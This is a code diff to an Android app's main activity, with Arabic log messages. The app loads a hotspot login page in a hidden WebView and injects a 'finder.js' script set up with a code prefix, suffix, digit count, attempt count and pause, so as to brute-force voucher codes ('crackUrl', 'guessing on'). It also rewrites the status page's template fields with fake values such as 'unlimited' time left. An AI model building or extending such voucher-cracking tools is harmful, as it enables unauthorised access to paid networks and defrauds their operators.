@@ -222,35 +222,56 @@ public class MainActivity extends Activity {
         int a = parseInt(etAttempts, 1000);
         int pz = parseInt(etPause, 1000);
         
+        appendLog("🔧 إعداد FINDER_CONFIG...");
         final String cfg = "window.FINDER_CONFIG={id:0,prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
+        
+        String crackUrl = realNetworkUrl;
+        if (!crackUrl.endsWith("/login") && !crackUrl.contains("index.html") && !crackUrl.contains(".html")) {
+            // إذا كان الرابط بدون صفحة، نضيف /login
+            if (crackUrl.endsWith("/")) crackUrl = crackUrl + "login";
+            else crackUrl = crackUrl + "/login";
+        }
+        final String finalCrackUrl = crackUrl;
+        
+        appendLog("🔧 سيتم التخمين على: " + finalCrackUrl);
+        appendLog("🔧 طول finder.js: " + finderJs.length() + " حرف");
         
         hiddenWeb.setWebViewClient(new WebViewClient() {
             @Override public void onPageFinished(WebView view, String url) {
-                view.evaluateJavascript(cfg, null);
-                view.evaluateJavascript(finderJs, null);
+                appendLog("📄 تم تحميل صفحة التخمين: " + url);
+                appendLog("🔧 حقن FINDER_CONFIG...");
+                view.evaluateJavascript(cfg, value -> {
+                    appendLog("✅ تم حقن الإعدادات");
+                    appendLog("🔧 حقن finder.js...");
+                    view.evaluateJavascript(finderJs, value2 -> {
+                        appendLog("✅ تم حقن السكربت - انتظر أول محاولة...");
+                    });
+                });
             }
         });
-        hiddenWeb.loadUrl(realNetworkUrl);
-        appendLog("▶ بدء التخمين على: " + realNetworkUrl);
+        hiddenWeb.loadUrl(finalCrackUrl);
         statusText.setText("جاري التخمين...");
     }
     
     private void fillStatusPage() {
         String js = "(function(){" +
-            "var p = new URLSearchParams(window.location.search);" +
-            "var v = p.get('voucher') || '" + lastVoucher + "';" +
-            "var ip = p.get('ip') || '" + lastIp + "';" +
-            "var up = p.get('uptime') || '" + lastUptime + "';" +
-            "var rem = p.get('remain') || '" + lastRemain + "';" +
-            "var html = document.body.innerHTML;" +
-            "html = html.replace(/\\$\\\\(username\\\\)/g, v);" +
-            "html = html.replace(/\\$\\\\(bytes-out-nice\\\\)/g, rem);" +
-            "html = html.replace(/\\$\\\\(session-time-left\\\\)/g, 'غير محدود');" +
-            "html = html.replace(/\\$\\\\(uptime\\\\)/g, up);" +
-            "html = html.replace(/\\$\\\\(bytes-in-nice\\\\)/g, '0 MB');" +
-            "html = html.replace(/\\$\\\\(ip\\\\)/g, ip);" +
-            "html = html.replace(/\\$\\\\(link-logout\\\\)/g, '#');" +
-            "document.body.innerHTML = html;" +
+            "var p=new URLSearchParams(window.location.search);" +
+            "var v=p.get('voucher')||'" + lastVoucher + "';" +
+            "var ip=p.get('ip')||'" + lastIp + "';" +
+            "var up=p.get('uptime')||'" + lastUptime + "';" +
+            "var rem=p.get('remain')||'" + lastRemain + "';" +
+            "var h=document.body.innerHTML;" +
+            "h=h.split('$(username)').join(v);" +
+            "h=h.split('$(bytes-out-nice)').join(rem);" +
+            "h=h.split('$(bytes-in-nice)').join('0 MB');" +
+            "h=h.split('$(session-time-left)').join('غير محدود');" +
+            "h=h.split('$(uptime)').join(up);" +
+            "h=h.split('$(ip)').join(ip);" +
+            "h=h.split('$(link-logout)').join('#');" +
+            "h=h.split('$(link-status)').join('#');" +
+            "h=h.split('$(link-orig)').join('#');" +
+            "h=h.split('$(error)').join('');" +
+            "document.body.innerHTML=h;" +
             "})()";
         webView.evaluateJavascript(js, null);
     }
